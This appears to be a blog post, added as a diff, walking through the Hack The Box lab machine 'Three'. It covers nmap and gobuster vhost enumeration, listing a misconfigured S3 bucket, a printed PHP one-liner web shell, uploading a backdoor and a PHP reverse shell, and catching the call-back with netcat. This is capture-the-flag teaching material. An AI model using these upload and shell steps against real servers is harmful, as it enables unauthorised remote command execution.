@@ -1,0 +1,241 @@
+---
+layout: post
+title: three
+categories: htb
+tags:
+- htb
+- starting_point
+- three
+author: nicoliboli
+description: starting point | tier 1 | box 4
+---
+
+# enumeration
+
+```
+$ nmap -sC -sV -p 22,80,1322 10.129.227.248
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-30 08:48 EDT
+Nmap scan report for thetoppers.htb (10.129.227.248)
+Host is up (0.099s latency).
+
+PORT     STATE  SERVICE  VERSION
+22/tcp   open   ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 17:8b:d4:25:45:2a:20:b8:79:f8:e2:58:d7:8e:79:f4 (RSA)
+|   256 e6:0f:1a:f6:32:8a:40:ef:2d:a7:3b:22:d1:c7:14:fa (ECDSA)
+|_  256 2d:e1:87:41:75:f3:91:54:41:16:b7:2b:80:c6:8f:05 (ED25519)
+80/tcp   open   http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: The Toppers
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+1322/tcp closed novation
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.40 seconds
+```
+
+## port 80 - http
+
+visit the site and scroll down to see a form. try to submit something but get a 404 error
+
+![three_home](/assets/img/three_home.png)
+
+![three_form](/assets/img/three_form.png)
+
+the full url is `http://10.129.227.248/action_page.php?Name=test&Email=test%40test.com&Message=test+message`
+
+![three_404](/assets/img/three_404.png)
+
+i also noticed the domain `thetoppers.htb` in an email right above the contact form. so add that to the `/etc/hosts` file to see what happens there
+
+```
+$ cat /etc/hosts                                               
+127.0.0.1       localhost
+127.0.1.1       kali
+10.129.227.248  thetoppers.htb
+```
+
+got the same page and still couldn't navigate to the `action_page.php` page
+
+`gobuster` didn't return anything useful as far as directories are concerned, so next i tried subdomains. that didn't work, so tried vhosts next and that popped a couple results. side note: [this post](https://wudiaries.com/2024/08/09/A-Comprehensive-Comparison-Between-Virtual-Hosts-and-Subdomains/) has a great breakdown of vhosts and subdomains. the author also gives multiple enumeration methods that are helpful for both.
+
+```
+$ gobuster vhost --append-domain -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://thetoppers.htb
+[+] Method:          GET
+[+] Threads:         10
+[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: s3.thetoppers.htb Status: 404 [Size: 21]
+Found: gc._msdcs.thetoppers.htb Status: 400 [Size: 306]
+Progress: 4989 / 4990 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+update the `/etc/hosts` file and visit the `s3.thetoppers.htb` site
+
+```
+$ cat /etc/hosts     
+127.0.0.1       localhost
+127.0.1.1       kali
+10.129.227.248  thetoppers.htb s3.thetoppers.htb gc._msdcs.thetoppers.htb
+```
+
+![three_toppers](/assets/img/three_toppers.png)
+
+### aws cli installation
+
+this was a bit of a pain mostly due to my `venv` ignorance. first had to setup a python virtual environment. if done successfully, then you should see a `(htb_three)` prepended to the usual username@hostname in the terminal prompt. then i can proceed to install `awscli`
+
+```
+$ python3 -m venv htb_three
+
+$ source htb_three/bin/activate
+
+$ pip3 install awscli                 
+Collecting awscli
+...
+```
+
+tried to access the s3 bucket two different ways, but they didn't work. note: the `--no-sign-request` prevents credentials from being used
+
+```
+$ aws s3 ls --endpoint-url http://s3.thetoppers.htb                                   
+
+Unable to locate credentials. You can configure credentials by running "aws configure".
+
+$ aws s3 ls s3://s3.thetoppers.htb --no-sign-request
+
+An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied
+```
+
+configure a profile and try to connect again. end up getting the bucket
+
+```
+$ aws configure --profile htb_three                   
+AWS Access Key ID [None]: test
+AWS Secret Access Key [None]: test
+Default region name [None]: test
+Default output format [None]: test
+
+$ aws s3 ls --profile htb_three --endpoint-url http://s3.thetoppers.htb
+2025-06-30 08:02:06 thetoppers.htb
+
+$ aws s3 ls --profile htb_three --endpoint-url http://s3.thetoppers.htb --recursive s3://thetoppers.htb
+2025-06-30 08:02:06          0 .htaccess
+2025-06-30 08:02:06      90172 images/band.jpg
+2025-06-30 08:02:06     282848 images/band2.jpg
+2025-06-30 08:02:07    2208869 images/band3.jpg
+2025-06-30 08:02:06      77206 images/final.jpg
+2025-06-30 08:02:06      69170 images/mem1.jpg
+2025-06-30 08:02:06      39270 images/mem2.jpg
+2025-06-30 08:02:06      64347 images/mem3.jpg
+2025-06-30 08:02:06      11952 index.php
+2025-06-30 09:06:28         31 shell.php
+```
+
+# exploitation
+
+looks like there is already a shell uploaded, but chances are it's not supposed to be there...
+
+```
+$ aws s3 cp --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb/shell.php .
+download: s3://thetoppers.htb/shell.php to ./shell.php
+
+$ cat shell.php                      
+<?php system($_GET["cmd"]); ?>
+```
+
+i copied my own shell up just to make sure that i could do it myself and tested the backdoor with a simple command
+
+```
+$ aws s3 cp /usr/share/webshells/php/simple-backdoor.php --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb/simple-backdoor.php 
+upload: ../../../usr/share/webshells/php/simple-backdoor.php to s3://thetoppers.htb/simple-backdoor.php
+
+$ aws s3 ls --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb            
+                           PRE images/
+2025-06-30 08:02:06          0 .htaccess
+2025-06-30 08:02:06      11952 index.php
+2025-06-30 09:06:28         31 shell.php
+2025-06-30 09:55:15        328 simple-backdoor.php
+
+```
+
+![three_backdoor](/assets/img/three_backdoor.png)
+
+so now that that works, i can cleanup, toss a reverse shell up there (the default from the php webshells directory on kali), setup the listener, and throw a curl request for `http://thetoppers.htb/index_backup.php`
+
+```
+$ aws s3 cp ./php-reverse-shell.php --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb/index_backup.php    
+upload: ./php-reverse-shell.php to s3://thetoppers.htb/index_backup.php
+
+$ aws s3 ls --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb                                         
+                           PRE images/
+2025-06-30 08:02:06          0 .htaccess
+2025-06-30 08:02:06      11952 index.php
+2025-06-30 10:15:43       5495 index_backup.php
+
+$ curl http://thetoppers.htb/index_backup.php 
+```
+
+```
+$ nc -lvnp 42069
+listening on [any] 42069 ...
+connect to [10.10.14.189] from (UNKNOWN) [10.129.227.248] 59712
+Linux three 4.15.0-189-generic #200-Ubuntu SMP Wed Jun 22 19:53:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+ 14:16:49 up  2:15,  0 users,  load average: 0.00, 0.02, 0.02
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:94:26:7b brd ff:ff:ff:ff:ff:ff
+    inet 10.129.227.248/16 brd 10.129.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 dead:beef::250:56ff:fe94:267b/64 scope global dynamic mngtmpaddr 
+       valid_lft 86393sec preferred_lft 14393sec
+    inet6 fe80::250:56ff:fe94:267b/64 scope link 
+       valid_lft forever preferred_lft forever
+3: br-2de548fc06bf: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
+    link/ether 02:42:2d:f2:e1:e8 brd ff:ff:ff:ff:ff:ff
+    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-2de548fc06bf
+       valid_lft forever preferred_lft forever
+    inet6 fe80::42:2dff:fef2:e1e8/64 scope link 
+       valid_lft forever preferred_lft forever
+4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
+    link/ether 02:42:e0:85:7f:c4 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+6: vethabdf1a4@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-2de548fc06bf state UP group default 
+    link/ether 22:e4:6b:76:93:e5 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet6 fe80::20e4:6bff:fe76:93e5/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+search around a bit and find the flag. don't forget to cleanup that reverse shell too
+
+![three_flag](/assets/img/three_flag.png)
+
+```
+$ aws s3 rm --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb/php-reverse-shell.php                   
+delete: s3://thetoppers.htb/php-reverse-shell.php
+```
